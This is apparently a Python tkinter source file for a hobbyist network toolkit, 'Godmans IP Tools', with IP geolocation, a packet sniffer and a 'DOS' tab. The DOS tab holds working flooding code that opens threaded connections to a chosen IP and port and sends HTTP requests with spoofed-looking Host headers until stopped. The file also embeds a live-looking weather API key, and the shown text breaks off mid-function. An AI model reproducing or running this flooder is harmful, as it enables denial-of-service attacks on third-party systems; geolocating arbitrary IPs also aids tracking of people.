from tkinter import *
from tkinter import ttk, messagebox, filedialog
from urllib.request import urlopen
from requests import get
from threading import Thread, Lock
from getpass import getuser
from time import strftime, gmtime, sleep
from random import randint
import scapy.all as scapy
import json, socket, concurrent.futures, collections

class Data:
    version = "v1.0.0"
    print_lock = Lock()
    user_ip = str(urlopen("https://api.ipify.org").read().decode().strip())
    pc_username = getuser()
    width = 500
    height = 500
    change_log = []
    previous_save = None

    with open('settings.json', 'r') as f:
        config = json.load(f)

        save_file = {
            "font": config.get('font'),
            "port_scanner_timeout": config.get('port_scanner_timeout'),
            "dos_timeout": config.get('dos_timeout'),
            "device_scanner_timeout": config.get('device_scanner_timeout'),
            "bg_color": config.get('bg_color'),
            "fg_color": config.get('fg_color'),
            "button_color": config.get('button_color'),
            "button_text_color": config.get('button_text_color'),
            "text_box_color": config.get('text_box_color')
        }
        edit_file = {
            "font": config.get('font'),
            "port_scanner_timeout": config.get('port_scanner_timeout'),
            "dos_timeout": config.get('dos_timeout'),
            "device_scanner_timeout": config.get('device_scanner_timeout'),
            "bg_color": config.get('bg_color'),
            "fg_color": config.get('fg_color'),
            "button_color": config.get('button_color'),
            "button_text_color": config.get('button_text_color'),
            "text_box_color": config.get('text_box_color')
        }

class Font:
    def normal(size:int):
        return (Data.save_file['font'], size, "normal")

    def bold(size:int):
        return (Data.save_file['font'], size, "normal")

class DOS:
    count = 0
    success_count = 0
    timer_count = 0
    run = False

class NetworkScanner:
    thread = None
    should_stop = True
    subdomain = ''
    src_ip_dict = collections.defaultdict(list)
    packet_display_list = []
    index_counter = 0
    previous_index = None
    current_target = None

class PortScanner:
    run = False
    count = 0
    success_count = 0

def main():
    root = Tk()
    root.title("Godmans IP Tools")
    root.resizable(False, False)
    try:
        root.iconbitmap("Images/Icons/new_trapagod_GLC_icon.ico")
    except Exception as e:
        messagebox.showerror("Failed to Load Icon", str(e))

    def reset_gui_func():
        op = messagebox.askyesno("Reset GUI", "Are you sure you want to reset the gui?")
        if op is False:
            return

        root.destroy()
        main()

    def settings_func():
        SettingsPopup = Toplevel(root)
        SettingsPopup.title("Settings")
        SettingsPopup.config(bg=Data.save_file['bg_color'])
        SettingsPopup.resizable(False, False)
        try:
            SettingsPopup.iconbitmap("Images/Icons/new_trapagod_GLC_icon.ico")
        except Exception as e:
            messagebox.showerror("Failed to Load Icon", str(e))

        def save_settings_func():
            Data.change_log = []
            if str(Data.edit_file['font']) != str(font_combo.get()):
                previous_font = str(Data.edit_file['font'])
                Data.edit_file['font'] = str(font_combo.get())
                Data.change_log.append({"to": f"Changed font to {str(font_combo.get())}", "from": f"Changed font from {previous_font}"})

            if int(Data.edit_file['port_scanner_timeout']) != int(port_scanner_timeout_entry.get()):
                previous_port_scanner_timeout = int(Data.edit_file['port_scanner_timeout'])
                Data.edit_file['port_scanner_timeout'] = int(port_scanner_timeout_entry.get())
                Data.change_log.append({"to": f"Changed port scanner timeout to {int(port_scanner_timeout_entry.get())}", "from": f"Changed port scanner timeout from {previous_port_scanner_timeout}"})

            if int(Data.edit_file['dos_timeout']) != int(dos_timeout_entry.get()):
                previous_dos_timeout = int(Data.edit_file['dos_timeout'])
                Data.edit_file['dos_timeout'] = int(dos_timeout_entry.get())
                Data.change_log.append({"to": f"Changed dos timeout to {int(dos_timeout_entry.get())}", "from": f"Changed dos timeout from {previous_dos_timeout}"})

            if int(Data.edit_file['device_scanner_timeout']) != int(device_scanner_timeout_entry.get()):
                previous_scanner_timeout = int(Data.edit_file['device_scanner_timeout'])
                Data.edit_file['device_scanner_timeout'] = int(device_scanner_timeout_entry.get())
                Data.change_log.append({"to": f"Changed device scanner timeout to {int(device_scanner_timeout_entry.get())}", "from": f"Changed device scanner timeout from {previous_scanner_timeout}"})

            if str(Data.edit_file['bg_color']) != str(background_color_entry.get()):
                previous_bg_color = str(Data.edit_file['bg_color'])
                Data.edit_file['bg_color'] = background_color_entry.get()
                Data.change_log.append({"to": f"Changed background color to {background_color_entry.get()}", "from": f"Changed background color from {previous_bg_color}"})

            if str(Data.edit_file['fg_color']) != str(text_color_entry.get()):
                previous_fg_color = str(Data.edit_file['fg_color'])
                Data.edit_file['fg_color'] = str(text_color_entry.get())
                Data.change_log.append({"to", f"Changed text color to {str(text_color_entry.get())}", "from", f"Changed text color from {previous_fg_color}"})

            if str(Data.edit_file['button_color']) != str(button_color_entry.get()):
                previous_btn_color = str(Data.edit_file['button_color'])
                Data.edit_file['button_color'] = str(button_color_entry.get())
                Data.change_log.append({"to", f"Changed button color to {str(button_color_entry.get())}", "from", f"Changed button color from {previous_btn_color}"})

            if str(Data.edit_file['button_text_color']) != str(button_text_color_entry.get()):
                previous_button_text_color = str(Data.edit_file['button_text_color'])
                Data.edit_file['button_text_color'] = str(button_text_color_entry.get())
                Data.change_log.append({"to": f"Changed button text color to {str(button_text_color_entry.get())}", "from": f"Changed button text color from {previous_button_text_color}"})

            if str(Data.edit_file['text_box_color']) != str(text_box_color_entry.get()):
                previous_text_box_color = str(Data.edit_file['text_box_color'])
                Data.edit_file['text_box_color'] = str(text_box_color_entry.get())
                Data.change_log.append({"to": f"Changed text box color to {str(text_box_color_entry.get())}", "from": f"Changed text box color from {previous_text_box_color}"})

            if Data.change_log == []:
                messagebox.showerror("Failed to Save Settings", "No settings were changed")
                return

            log = []
            for res in Data.change_log:
                log.append(res['to'])
            logs = "\n".join(log)
            op = messagebox.askyesno("Save Settings", f"Are you sure you want to change the following settings?\n\n{logs}")
            if op is False:
                return

            Data.previous_save = Data.save_file
            Data.save_file = Data.edit_file
            with open('settings.json', 'w') as f:
                json.dump(Data.save_file, f, indent=4)
            root.destroy()
            main()

        def undo_save_func():
            if Data.previous_save is None:
                messagebox.showerror("Failed to Undo Save", "There is no save to back up to")
                return
            
            log = []
            for i in Data.change_log:
                log.append(i['from'])
            logs = "\n".join(log)
            op = messagebox.askyesno("Undo Save", f"Are you sure you want the following changes to revert?\n\n{logs}")
            if op is False:
                return

            Data.save_file = Data.previous_save
            Data.edit_file = Data.previous_save
            Data.previous_save = None
            with open('settings.json', "w") as f:
                json.dump(Data.save_file, f, indent=4)
            root.destroy()
            main()

        def save_config_func():
            file = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Json File", "*.json"),], title="Save Config")
            if file == '':
                return

            with open(file, 'w') as f:
                json.dump(Data.save_file, f, indent=4)

        def load_config_func():
            file = filedialog.askopenfilename(defaultextension=".json", title="Load Config", filetypes=[("Json File", "*.json"),])
            if file == '':
                return

            change_log = []
            with open(file, 'r') as f:
                config = json.load(f)

                new_file = {
                    "font": config.get('font'),
                    "port_scanner_timeout": config.get('port_scanner_timeout'),
                    "dos_timeout": config.get('dos_timeout'),
                    "device_scanner_timeout": config.get('device_scanner_timeout'),
                    "bg_color": config.get('bg_color'),
                    "fg_color": config.get('fg_color'),
                    "button_color": config.get('button_color'),
                    "button_text_color": config.get('button_text_color'),
                    "text_box_color": config.get('text_box_color')
                }

            if Data.save_file['font'] != new_file['font']:
                change_log.append(f"Font: {new_file['font']}")

            if Data.save_file['port_scanner_timeout'] != new_file['port_scanner_timeout']:
                change_log.append(f"Port Scanner Timeout: {new_file['port_scanner_timeout']}")

            if Data.save_file['dos_timeout'] != new_file['dos_timeout']:
                change_log.append(f"DOS Timeout: {new_file['dos_timeout']}")

            if Data.save_file['device_scanner_timeout'] != new_file['device_scanner_timeout']:
                change_log.append(f"Device Scanner Timeout: {new_file['device_scanner_timeout']}")

            if Data.save_file['bg_color'] != new_file['bg_color']:
                change_log.append(f"Background Color: {new_file['bg_color']}")

            if Data.save_file['fg_color'] != new_file['fg_color']:
                change_log.append(f"Text Color: {new_file['fg_color']}")

            if Data.save_file['button_color'] != new_file['button_color']:
                change_log.append(f"Button Color: {new_file['button_color']}")

            if Data.save_file['button_text_color'] != new_file['button_text_color']:
                change_log.append(f"Button Text Color: {new_file['button_text_color']}")

            if Data.save_file['text_box_color'] != new_file['text_box_color']:
                change_log.append(f"Text Box Color: {new_file['text_box_color']}")

            if change_log == []:
                messagebox.showerror("Failed to Load Config", f"Config has same settings as current save")
                return

            logs = '\n'.join(change_log)
            op = messagebox.askyesno("Load Config", f"Are you sure you want to load the following settings?\n\n{logs}")
            if op is False:
                return

            Data.save_file = new_file
            Data.edit_file = new_file
            with open('settings.json', 'w') as f:
                json.dump(Data.save_file, f, indent=4)
            root.destroy()
            main()

        def reset_settings_func():
            op = messagebox.askyesno("Reset settings", "Are you sure you want to reset settings to default?")
            if op is False:
                return

            Data.save_file['font'] = "consolas"
            Data.save_file['port_scanner_timeout'] = 1
            Data.save_file['dos_timeout'] = 1
            Data.save_file['device_scanner_timeout'] = 1
            Data.save_file['bg_color'] = "#949494"
            Data.save_file['fg_color'] = "#000000"
            Data.save_file['button_color'] = "#404040"
            Data.save_file['button_text_color'] = "#ffffff"
            Data.save_file['text_box_color'] = "#bababa"

            Data.edit_file = Data.save_file
            with open('settings.json', 'w') as f:
                json.dump(Data.save_file, f, indent=4)
            root.destroy()
            main()
 
        settings_menu = Menu(SettingsPopup, tearoff=False)
        SettingsPopup.config(menu=settings_menu)
        settings_menu.add_command(label="Reset to Default Settings", command=reset_settings_func)

        main_settings_frame = LabelFrame(SettingsPopup, text="Settings", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color'])
        main_settings_frame.pack(padx=10, pady=10)

        settings_feilds_frame = Frame(main_settings_frame, bg=Data.save_file['bg_color'])
        settings_feilds_frame.pack()

        settings_buttons_frame = Frame(main_settings_frame, bg=Data.save_file['bg_color'])
        settings_buttons_frame.pack()

        Label(settings_feilds_frame, text="Font", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=0)
        Label(settings_feilds_frame, text="Port Scanner Timeout", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=1)
        Label(settings_feilds_frame, text="DOS Timeout", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=2)
        Label(settings_feilds_frame, text="Device Scanner Timeout", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=3)
        Label(settings_feilds_frame, text="Background Color", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=4)
        Label(settings_feilds_frame, text="Text Color", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=5)
        Label(settings_feilds_frame, text="Button Color", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=6)
        Label(settings_feilds_frame, text="Button_text_color", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=7)
        Label(settings_feilds_frame, text="Text Box Color", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=8)

        font_combo = ttk.Combobox(settings_feilds_frame, font=Font.normal(10), width=14, values=['consolas', 'Helvetica', 'Times', 'Arial'])
        font_combo.grid(column=1, row=0)
        if Data.edit_file['font'] == "consolas":
            font_combo.current(0)
        elif Data.edit_file['font'] == "Helvetica":
            font_combo.current(1)
        elif Data.edit_file['font'] == "Times":
            font_combo.current(2)
        elif Data.edit_file['font'] == "Arial":
            font_combo.current(3)
        else:
            font_combo.insert(0, Data.edit_file['font'])

        port_scanner_timeout_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        port_scanner_timeout_entry.grid(column=1, row=1)
        port_scanner_timeout_entry.bind("<Return>", lambda event: save_settings_func())
        port_scanner_timeout_entry.insert(0, Data.edit_file['port_scanner_timeout'])

        dos_timeout_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        dos_timeout_entry.grid(column=1, row=2)
        dos_timeout_entry.bind("<Return>", lambda event: save_settings_func())
        dos_timeout_entry.insert(0, Data.edit_file['dos_timeout'])

        device_scanner_timeout_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        device_scanner_timeout_entry.grid(column=1, row=3)
        device_scanner_timeout_entry.bind("<Return>", lambda event: save_settings_func())
        device_scanner_timeout_entry.insert(0, Data.edit_file['device_scanner_timeout'])

        background_color_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        background_color_entry.grid(column=1, row=4)
        background_color_entry.bind("<Return>", lambda event: save_settings_func())
        background_color_entry.insert(0, Data.edit_file['bg_color'])

        text_color_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        text_color_entry.grid(column=1, row=5)
        text_color_entry.bind("<Return>", lambda event: save_settings_func())
        text_color_entry.insert(0, Data.edit_file['fg_color'])

        button_color_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        button_color_entry.grid(column=1, row=6)
        button_color_entry.bind("<Return>", lambda event: save_settings_func())
        button_color_entry.insert(0, Data.edit_file['button_color'])

        button_text_color_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        button_text_color_entry.grid(column=1, row=7)
        button_text_color_entry.bind("<Return>", lambda event: save_settings_func())
        button_text_color_entry.insert(0, Data.edit_file['button_text_color'])

        text_box_color_entry = Entry(settings_feilds_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        text_box_color_entry.grid(column=1, row=8)
        text_box_color_entry.bind("<Return>", lambda event: save_settings_func())
        text_box_color_entry.insert(0, Data.edit_file['text_box_color'])

        save_settings_btn = Button(settings_buttons_frame, text="Save Settings", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=save_settings_func)
        save_settings_btn.grid(column=0, row=0, padx=5, pady=5)
        save_settings_btn.bind("<Return>", lambda event: save_settings_func())

        undo_save_btn = Button(settings_buttons_frame, text="Undo Save", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=undo_save_func)
        undo_save_btn.grid(column=1, row=0, padx=5, pady=5)
        undo_save_btn.bind("<Return>", lambda event: undo_save_func())

        save_config_btn = Button(settings_buttons_frame, text="Save Config", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=save_config_func)
        save_config_btn.grid(column=0, row=1, padx=5, pady=5)
        save_config_btn.bind("<Return>", lambda event: save_config_func())

        load_config_btn = Button(settings_buttons_frame, text="Load Config", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=load_config_func)
        load_config_btn.grid(column=1, row=1, padx=5, pady=5)
        load_config_btn.bind("<Return>", lambda event: load_config_func())

    def disable_all_func():
        op = messagebox.askyesno("Disable All", "Are you sure you want to disable all?")
        if op is False:
            return

        DOS.run = False
        NetworkScanner.should_stop = True
        PortScanner.run = False

    main_menu = Menu(root, tearoff=False)
    root.config(menu=main_menu)
    file_menu = Menu(main_menu, tearoff=False)
    main_menu.add_cascade(label="File", menu=file_menu)

    file_menu.add_command(label="Settings", command=settings_func)
    file_menu.add_command(label="Reset GUI", command=reset_gui_func)

    main_notebook = ttk.Notebook(root)
    main_notebook.pack()

    def create_geoip():
        def search_func():
            ip = str(ip_entry.get())

            r = get(f'http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query').json()
            city = r['city']
            res = get(f"https://api.openweathermap.org/data/2.5/weather?q={city}&units=imperial&appid=ae8d109c96f01d4348c39d0395146f3e").json()
            weather_longitude = res['coord']['lon']
            weather_lattitude = res['coord']['lat']
            weather = res['weather'][0]['main']
            weather_description = res['weather'][0]['description']
            overall_temp = res['main']['temp']
            feels_like_temp = res['main']['feels_like']
            min_temp = res['main']['temp_min']
            max_temp = res['main']['temp_max']
            pressure = res['main']['pressure']
            humidity = res['main']['humidity']
            visabillity = res['visibility']
            wind_speed = res['wind']['speed']
            deg = res['wind']['deg']
            cloud_distance = res['dt']
            sys_type = res['sys']['type']
            country = res['sys']['country']
            city_name = res['name']

            time_zone = res['timezone']
            sunrise = res['sys']['sunrise']
            sunset = res['sys']['sunset']
            time_rise = int(sunrise) - int(time_zone)
            time_set = int(sunset) - int(time_zone)
            sun_rise = strftime("%I:%M:%S %p", gmtime(int(time_rise)))
            sun_set = strftime("%I:%M:%S %p", gmtime(int(time_set)))

            ipaddress = r['query']
            continent = r['continent']
            contienet_code = r['continentCode']
            country = r['country']
            country_code = r['countryCode']
            region = r['region']
            region_name = r['regionName']
            zip_code = r['zip']
            lattitude = r['lat']
            longitude = r['lon']
            tim_zone = r['timezone']
            offset = r['offset']
            currency = r['currency']
            isp = r['isp']
            org = r['org']
            _as = r['as']
            as_name = r['asname']
            mobile = r["mobile"]
            proxy = r['proxy']
            hosting = r['hosting']

            data_string = f'''Target Query: {ip}
IP: {ipaddress}
Continent: {contienet_code} | {continent}
Country: {country_code} | {country}
Region: {region} | {region_name}
City: {city}
ZIP Code: {zip_code}
Lat and Lon: {lattitude} | {longitude}
Time Zone: {tim_zone}
Currency: {currency}
ISP: {isp}
ORG: {org}
AS: {_as} | {as_name}
Mobile: {mobile}
Proxy: {proxy}
Hosting: {hosting}
Weather: {weather} | {weather_description}
Temperature: {overall_temp}°
Min temp - Max Temp: {min_temp}° | {max_temp}°
Feels Like: {feels_like_temp}°
Pressure: {pressure}
Humidity: {humidity}%
Visabillity: {visabillity / 5280}
Wind Speed: {wind_speed}
Wind Direction: {deg}
Sun Rise: {sun_rise}
Sun Set: {sun_set}
-------------------------------------------

'''
            geoip_text.insert(END, data_string)

        geoip_fields_frame = Frame(geoip_frame, bg=Data.save_file['bg_color'])
        geoip_fields_frame.pack()

        geoip_buttons_frame = Frame(geoip_frame, bg=Data.save_file['bg_color'])
        geoip_buttons_frame.pack()

        Label(geoip_fields_frame, text="IP", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=0)

        ip_entry = Entry(geoip_fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        ip_entry.grid(column=1, row=0)
        ip_entry.bind("<Return>", lambda event: search_func())
        ip_entry.insert(0, Data.user_ip)

        search_btn = Button(geoip_buttons_frame, text="Search IP", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=search_func)
        search_btn.grid(column=0, row=0, padx=5, pady=5)
        search_btn.bind("<Return>", lambda event: search_func())

        clear_btn = Button(geoip_buttons_frame, text="Clear", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=lambda: geoip_text.delete(1.0, END))
        clear_btn.grid(column=1, row=0, padx=5, pady=5)
        clear_btn.bind("<Return>", lambda event: geoip_text.delete(1.0, END))

        geoip_text = Text(geoip_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        geoip_text.pack(fill=BOTH, expand=True)

    def create_dos():
        def attack(ip:str, port:int):
            while DOS.run is True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(Data.save_file['dos_timeout'])
                fake_ip = f"{randint(255, 999)}.{randint(255, 999)}.{randint(255, 999)}.{randint(255, 999)}"
                try:
                    s.connect((ip, port))
                    s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode("ascii"), (ip,port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (ip,port))
                    s.close()
                    with Data.print_lock:
                        DOS.count += 1
                        DOS.success_count += 1
                        row = dos_tree.insert("", END, text=f"Sent Packet #{DOS.count}")
                        dos_tree.insert(row, END, text=f"Sent packet #{DOS.count} to {ip}/{port} from {fake_ip}")
                except Exception as e:
                    with Data.print_lock:
                        DOS.count += 1
                        row = dos_tree.insert("", END, text=f"Failed to Send Packet #{DOS.count}")
                        dos_tree.insert(row, END, text=str(e))

        def timer(seconds):
            DOS.timer_count = 0
            infinity = False
            if seconds == '':
                infinity = True
                seconds = 1

            while int(seconds) > int(DOS.timer_count):
                if DOS.run is False:
                    break
                sleep(1)
                if infinity is True:
                    seconds += 1
                DOS.timer_count += 1
                timer_label.config(text=f"Timer: {strftime('%H:%M:%S', gmtime(DOS.timer_count))}")
            DOS.run = False

        def start_attack_func():
            for c in dos_tree.get_children():
                dos_tree.delete(c)

            DOS.count = 0
            DOS.success_count = 0
            DOS.run = True

            ip = str(ip_entry.get())
            port = int(port_combo.get())
            seconds = seconds_entry.get()
            threads = int(threads_entry.get())

            Thread(target=timer, args=[seconds]).start()
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threads):
                    executor.submit(attack, ip, port)
            messagebox.showinfo(f"Attacked {ip}/{port}", f"Sent {DOS.count} packets to {ip}/{port}. {DOS.success_count} packets went through successfully")

        def stop_attack_func():
            if DOS.run is False:
                messagebox.showerror("Failed to Stop Attack", "There is no attack running")
                return

            DOS.run = False

        timer_label = Label(dos_frame, text=f"Timer: {strftime('%H:%M:%S', gmtime(DOS.timer_count))}", font=Font.bold(20), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color'])
        timer_label.pack()

        dos_fields_frame = Frame(dos_frame, bg=Data.save_file['bg_color'])
        dos_fields_frame.pack()

        dos_buttons_frame = Frame(dos_frame, bg=Data.save_file['bg_color'])
        dos_buttons_frame.pack()

        Label(dos_fields_frame, text="IP", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=0)
        Label(dos_fields_frame, text="Port", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=1)
        Label(dos_fields_frame, text="Threads", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=2)
        Label(dos_fields_frame, text="Seconds", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=3)

        ip_entry = Entry(dos_fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        ip_entry.grid(column=1, row=0)
        ip_entry.bind("<Return>", lambda event: Thread(target=start_attack_func).start())

        ports = [0]
        for i in range(65535):
            ports.append(i + 1)
        port_combo = ttk.Combobox(dos_fields_frame, font=Font.normal(10), width=8, values=ports)
        port_combo.grid(column=1, row=1)
        port_combo.current(1)

        threads_entry = Entry(dos_fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        threads_entry.grid(column=1, row=2)
        threads_entry.bind("<Return>", lambda event: Thread(target=start_attack_func).start())

        seconds_entry = Entry(dos_fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        seconds_entry.grid(column=1, row=3)
        seconds_entry.bind("<Return>", lambda event: Thread(target=start_attack_func).start())

        start_attack_btn = Button(dos_buttons_frame, text="Start Attack", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=lambda: Thread(target=start_attack_func).start())
        start_attack_btn.grid(column=0, row=0, padx=5, pady=5)
        start_attack_btn.bind("<Return>", lambda event: Thread(target=start_attack_func).start())

        stop_attack_btn = Button(dos_buttons_frame, text="Stop Attack", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=stop_attack_func)
        stop_attack_btn.grid(column=1, row=0, padx=5, pady=5)
        stop_attack_btn.bind("<Return>", lambda event: stop_attack_func())

        dos_tree = ttk.Treeview(dos_frame)
        dos_tree.pack(fill=BOTH, expand=True)

    def create_network_scanner():
        def start():
            NetworkScanner.subdomain = str(subdomain_entry.get())
            if NetworkScanner.thread is None or not NetworkScanner.thread.is_alive():
                NetworkScanner.should_stop = False
                NetworkScanner.thread = Thread(target=sniffing).start()
            else:
                messagebox.showerror("Failed to Start Scanner", "Scanner is already running")

        def stop():
            if NetworkScanner.should_stop is True:
                messagebox.showerror("Failed to Stop", "There is no scanner running")
                return
            NetworkScanner.should_stop = True

        def sniffing():
            try:
                f = str(filter_entry.get())
                scapy.sniff(prn=find_ips, stop_filter=stop_sniffing, filter="")
            except Exception as e:
                print(e)

        def stop_sniffing(f):
            return NetworkScanner.should_stop

        def find_ips(packet):
            if "IP" in packet:
                src_ip = packet['IP'].src
                dst_ip = packet['IP'].dst

                data = {'src_ip': src_ip, 'dst_ip': dst_ip, 'packet': packet, 'index': NetworkScanner.index_counter}

                if src_ip[0:len(NetworkScanner.subdomain)] == NetworkScanner.subdomain:
                    if src_ip not in NetworkScanner.src_ip_dict:
                        NetworkScanner.src_ip_dict[src_ip].append(dst_ip)

                else:
                    if dst_ip not in NetworkScanner.src_ip_dict[src_ip]:
                        NetworkScanner.src_ip_dict[src_ip].append(dst_ip)

                        current_item = scanner_tree.focus()
                        if scanner_tree.item(current_item)['text'] == src_ip:
                            data['dst_ip'] = dst_ip

                NetworkScanner.index_counter += 1
                NetworkScanner.packet_display_list.append(data)
                row = scanner_tree.insert("", END, text=f"Desination: {dst_ip}")
                scanner_tree.insert(row, END, text=f"Source: {src_ip}")

        def update_scanner_tree():
            try:
                if scanner_tree.focus() == '':
                    output_text.delete(1.0, END)
                else:
                    ress = NetworkScanner.packet_display_list[int(scanner_tree.index(scanner_tree.focus()))]
                    if ress['index'] != NetworkScanner.previous_index:
                        NetworkScanner.previous_index = ress['index']
                        output_text.delete(1.0, END)
                        data_string = None
                        target = None
                        if '10.0' in ress['src_ip']:
                            target = ress['dst_ip']
                        elif '10.0' in ress['dst_ip']:
                            target = ress['src_ip']
                        ip_data = False
                        try:
                            r = get(f'http://ip-api.com/json/{target}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query').json()
                            city = r['city']
                            res = get(f"https://api.openweathermap.org/data/2.5/weather?q={city}&units=imperial&appid=ae8d109c96f01d4348c39d0395146f3e").json()
                            weather_longitude = res['coord']['lon']
                            weather_lattitude = res['coord']['lat']
                            weather = res['weather'][0]['main']
                            weather_description = res['weather'][0]['description']
                            overall_temp = res['main']['temp']
                            feels_like_temp = res['main']['feels_like']
                            min_temp = res['main']['temp_min']
                            max_temp = res['main']['temp_max']
                            pressure = res['main']['pressure']
                            humidity = res['main']['humidity']
                            visabillity = res['visibility']
                            wind_speed = res['wind']['speed']
                            deg = res['wind']['deg']
                            cloud_distance = res['dt']
                            sys_type = res['sys']['type']
                            country = res['sys']['country']
                            city_name = res['name']

                            time_zone = res['timezone']
                            sunrise = res['sys']['sunrise']
                            sunset = res['sys']['sunset']
                            time_rise = int(sunrise) - int(time_zone)
                            time_set = int(sunset) - int(time_zone)
                            sun_rise = strftime("%I:%M:%S %p", gmtime(int(time_rise)))
                            sun_set = strftime("%I:%M:%S %p", gmtime(int(time_set)))

                            ipaddress = r['query']
                            continent = r['continent']
                            contienet_code = r['continentCode']
                            country = r['country']
                            country_code = r['countryCode']
                            region = r['region']
                            region_name = r['regionName']
                            zip_code = r['zip']
                            lattitude = r['lat']
                            longitude = r['lon']
                            tim_zone = r['timezone']
                            offset = r['offset']
                            currency = r['currency']
                            isp = r['isp']
                            org = r['org']
                            _as = r['as']
                            as_name = r['asname']
                            mobile = r["mobile"]
                            proxy = r['proxy']
                            hosting = r['hosting']

                            stri = f'''Target Query: {target}
IP: {ipaddress}
Continent: {contienet_code} | {continent}
Country: {country_code} | {country}
Region: {region} | {region_name}
City: {city}
ZIP Code: {zip_code}
Lat and Lon: {lattitude} | {longitude}
Time Zone: {tim_zone}
Currency: {currency}
ISP: {isp}
ORG: {org}
AS: {_as} | {as_name}
Mobile: {mobile}
Proxy: {proxy}
Hosting: {hosting}
Weather: {weather} | {weather_description}
Temperature: {overall_temp}°
Min temp - Max Temp: {min_temp}° | {max_temp}°
Pressure: {pressure}
Humidity: {humidity}%
Visabillity: {visabillity / 5280}
Wind Speed: {wind_speed}
Wind Direction: {deg}
Sun Rise: {sun_rise}
Sun Set: {sun_set}
-------------------------------------------
'''

                            data_string = f'''{stri}

Packet: {ress['packet']}'''
                            ip_data = True
                            NetworkScanner.current_target = target
                        except Exception as e:
                            pass

                        if ip_data is False:
                            data_string = str(ress['packet'])

                        output_text.insert(1.0, data_string)
            except Exception as e:
                print(e)
            root.after(50, update_scanner_tree)

        def clear_tree():
            for c in scanner_tree.get_children():
                scanner_tree.delete(c)

        fields_frame = Frame(network_scanner_frame, bg=Data.save_file['bg_color'])
        fields_frame.pack()

        buttons_frame = Frame(network_scanner_frame, bg=Data.save_file['bg_color'])
        buttons_frame.pack()

        Label(fields_frame, text="Subdomain", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=0)
        Label(fields_frame, text="Filter", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=1)

        subdomain_entry = Entry(fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        subdomain_entry.grid(column=1, row=0)
        subdomain_entry.bind("<Return>", lambda event: start())

        filter_entry = Entry(fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        filter_entry.grid(column=1, row=1)
        filter_entry.bind("<Return>", lambda event: start())

